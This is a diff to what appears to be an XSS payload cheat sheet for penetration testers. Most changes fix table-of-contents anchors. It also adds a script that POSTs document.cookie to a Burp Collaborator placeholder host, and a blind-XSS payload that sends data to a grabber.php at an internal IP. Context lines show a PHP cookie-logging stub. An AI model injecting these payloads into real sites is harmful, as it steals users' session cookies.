@@ -37,16 +37,16 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass dot filter](#bypass-dot-filter)
   - [Bypass parenthesis for string](#bypass-parenthesis-for-string)
   - [Bypass parenthesis and semi colon](#bypass-parenthesis-and-semi-colon)
-  - [Bypass onxxxx= blacklist](#bypass-onxxxx---blacklist)
+  - [Bypass onxxxx= blacklist](#bypass-onxxxx-blacklist)
   - [Bypass space filter](#bypass-space-filter)
   - [Bypass email filter](#bypass-email-filter)
   - [Bypass document blacklist](#bypass-document-blacklist)
   - [Bypass using javascript inside a string](#bypass-using-javascript-inside-a-string)
-  - [Bypass using an alternate way to redirect](#bypass-unsing-an-alternate-way-to-redirect)
+  - [Bypass using an alternate way to redirect](#bypass-using-an-alternate-way-to-redirect)
   - [Bypass using an alternate way to execute an alert](#bypass-using-an-alternate-way-to-execute-an-alert)
-  - [Bypass ">" using nothing](#bypass----using-nothing)
-  - [Bypass "<" and ">" using ＜ and ＞](#bypass----using-＜)
-  - [Bypass ";" using another character](#bypass-using------using-another-character)
+  - [Bypass ">" using nothing](#bypass--using-nothing)
+  - [Bypass "<" and ">" using ＜ and ＞](#bypass--and--using--and-)
+  - [Bypass ";" using another character](#bypass--using-another-character)
   - [Bypass using HTML encoding](#bypass-using-html-encoding)
   - [Bypass using Katana](#bypass-using-katana)
   - [Bypass using Cuneiform](#bypass-using-cuneiform)
@@ -54,10 +54,10 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
   - [Bypass using ECMAScript6](#bypass-using-ecmascript6)
   - [Bypass using Octal encoding](#bypass-using-octal-encoding)
   - [Bypass using Unicode](#bypass-using-unicode)
-  - [Bypass using UTF-7](#bypass-using-utf---7)
-  - [Bypass using UTF-8](#bypass-using-utf---8)
-  - [Bypass using UTF-16be](#bypass-using-utf---16be)
-  - [Bypass using UTF-32](#bypass-using-utf---32)
+  - [Bypass using UTF-7](#bypass-using-utf-7)
+  - [Bypass using UTF-8](#bypass-using-utf-8)
+  - [Bypass using UTF-16be](#bypass-using-utf-16be)
+  - [Bypass using UTF-32](#bypass-using-utf-32)
   - [Bypass using BOM](#bypass-using-bom)
   - [Bypass using weird encoding or native interpretation](#bypass-using-weird-encoding-or-native-interpretation)
   - [Bypass using jsfuck](#bypass-using-jsfuck)
@@ -88,6 +88,18 @@ $fp = fopen('cookies.txt', 'a+');
 fwrite($fp, 'Cookie:' .$cookie."\r\n");
 fclose($fp);
 ?>
+```
+
+### CORS
+
+```html
+<script>
+  fetch('https://<SESSION>.burpcollaborator.net', {
+  method: 'POST',
+  mode: 'no-cors',
+  body: document.cookie
+  });
+</script>
 ```
 
 ### UI redressing
@@ -425,7 +437,6 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 
 - [sleepy-puppy - Netflix](https://github.com/Netflix-Skunkworks/sleepy-puppy)
 - [bXSS - LewisArdern](https://github.com/LewisArdern/bXSS)
-- [BlueLotus_XSSReceiver - FiresunCN](https://github.com/firesunCN/BlueLotus_XSSReceiver)
 - [ezXSS - ssl](https://github.com/ssl/ezXSS)
 
 ### Blind XSS endpoint
@@ -440,6 +451,22 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
   - Administrative Panel logs
 - Comment Box
   - Administrative Panel
+
+### Tips
+
+You can use a [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
+
+Eg. payload
+
+```html
+<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
+```
+
+Eg. one-line HTTP server:
+
+```
+$ ruby -run -ehttpd . -p8080
+```
 
 ## Mutated XSS
 
